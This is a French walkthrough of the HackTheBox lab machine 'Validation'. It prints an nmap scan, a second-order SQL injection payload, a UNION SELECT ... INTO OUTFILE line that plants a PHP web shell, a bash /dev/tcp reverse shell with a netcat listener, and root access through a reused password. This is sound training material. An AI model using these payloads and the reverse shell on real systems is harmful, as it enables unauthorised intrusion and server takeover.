# [Validation] — HackTheBox

## Informations
- **Difficulté** : Easy
- **OS** : Linux
- **Date** : 14/03/2026


## Résumé
Validation est une machine Linux très facile incluant un serveur web performant des requêtes vers une base de données SQL, permettant à l'attaquant d'injecter et de stocker des requêtes malicieuses afin de gagner en privilège.


## Enumération
À chaque début de machine, on lance d'abord un scan nmap afin de savoir quels ports sont ouverts sur le serveur.
"nmap -Pn -sVC -p- {target_IP}"

Après le scan de la machine, on peut voir qu'il y a beaucoup de ports découverts, mais seulement quatre d'ouverts. Notamment le port 22 (SSH), ainsi que les ports 80, 4566 et 8080 (HTTP).
Fait intéressant, OpenSSH tourne sur la version Ubuntu, alors qu'Apache tourne sur Debian. Petite note sur le fait qu'une conteneurisation peut avoir lieu.

Sans quelconque crédit utilisateur:motdepasse, nous allons d'abord faire un tour sur le site internet lié au serveur.


## Exploitation
En arrivant sur la page du site, seul un nom d'utilisateur et un menu dropdown avec des pays nous sont accessibles.
Créons un nom d'utilisateur et interceptons la requête via Burp Suite. On peut y voir un cookie nommé "user" ainsi qu'une redirection nous amenant sur la page `/account.php`.

Dans le corps de la requête, on peut apercevoir que le nom ainsi que le pays sont deux valeurs qui peuvent être changées. Nous allons donc appliquer les techniques d'injections SQL pour tester si en envoyant une syntaxe SQL correcte, des valeurs nous seront renvoyées. Pour plus d'informations sur les SQLi (injections SQL), se référer aux ressources.

Toujours dans Burp Suite, on teste une simple apostrophe qui suit le pays, retournant une erreur comme suit :
`Fatal error: Uncaught Error: Call to a member function fetch_assoc() on bool in /var/www/html/account.php:33 Stack trace: #0 {main} thrown in /var/www/html/account.php on line 33`.

Cette erreur nous indique donc que la syntaxe n'est pas acceptée, mais que la requête a tout de même été effectuée.
Retentons avec un double tiret et nous n'avons plus ce soucis.

Nous savons donc que l'application web a une faille au niveau des requêtes envoyées au serveur, nous permettons d'injecter du code SQL malicieux.
La première chose à tester est donc d'envoyer une requête avec un nouveau nom d'utilisateur afin de générer un nouveau cookie de session, et d'injecter le payload suivant collé au nom du pays :
`' UNION SELECT 1-- -`

Dans la redirection vers /account.php, recopier le cookie fraîchement sorti dans la dernière requête nous renvoie bien notre requête SQL :

`<li class='text-white'>`
    1
`</li>`

Puisque nous avons bel et bien confirmation qu'une injection SQL de second-ordre est en place, nous pouvons donc tenter d'implémenter une webshell en introduisant du code php via notre requête malicieuse :
`{Pays}' UNION SELECT "<?php echo system($_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'-- -`

Puis recharger la page pour implémenter de manière intégrale notre shell et également naviguer vers '/shell.php' pour confirmer cela.


## Accès initial (user flag)
Le fichier maintenant en place sur le serveur hôte, nous pouvons récupérer l'accès via une commande `curl` :
`curl http://{target-IP}/shell.php?cmd=id`

La réponse ne se fait pas attendre :
`uid=33(www-data) gid=33(www-data) groups=33(www-data)`

A partir de là, nous pouvons récupérer un shell interactif assez facilement. Commençons par installer notre environnement sur la machine hôte puis de mettre en place une écoute de netcat sur le port 4444, comme suit :
`curl {target-IP}/shell.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/{notre-IP}/4444 0>&1"'`
`sudo nc -lvnp 4444`
et attendre que la connexion se fasse.

Une fois la connexion établie, nous pouvons faire le tour du propriétaire afin de trouver le flag utilisateur, se trouvant dans le répertoire `/home/htb`.


## Privilege Escalation
Désormais, nous allons essayer d'obtenir les crédits administrateurs afin d'accéder au root flag.

Lorsque nous arrivons sur la machine hôte, en faisant une liste des fichiers présents, on remarque plusieurs fichiers avec des extensions php, mais le plus intéressant est `config.php`.

L'ouvrir nous donnera un nom de serveur, d'utilisateur ainsi qu'un mot de passe.
Mot de passe contenant la mention `global-pw`, indiquant une forte probabilité de réutilisation de mots de passe.


## Root flag
Il suffit de changer d'utilisateur avec la commande `sudo -` et d'entrer le mot de passe trouvé à l'instant.
Puis d'effectuer la commande `id` afin de s'assurer que le nouvel utilisateur soit bien l'administrateur du réseau local.

Une fois ceci fait, un peu de recherche nous amène au dossier `/root` contenant le flag `root.txt`.


## Pourquoi ça marche
Les commentaires en SQL, commençant par deux tirets, sont utilisés pour indiquer des commentaires sur une seule ligne. Tout texte situé après ces deux tirets sur la même ligne est ignoré par le serveur.
Une SQLi stockée (dites de "**second ordre**"), est une injection de syntaxe SQL qui reste sur la page même après le raffraîchissement de cette dernière. Le problème étant qu'un utilisateur malveillant peut, comme ici, introduire du code PHP malveillant et obtenir plus de privilèges sur le serveur qui héberge l'application web.

**Kill chain :**
Stored SQLi → PHP RCE → reverse shell → Administrator credentials


## Ressources
nmap : https://nmap.org/man/fr/index.html
SQLi : https://hacktricks.wiki/en/pentesting-web/sql-injection/index.html
Shell : https://hacktricks.wiki/en/generic-hacking/reverse-shells/linux.html
curl : https://linux.die.net/man/1/curl
netcat : https://linux.die.net/man/1/nc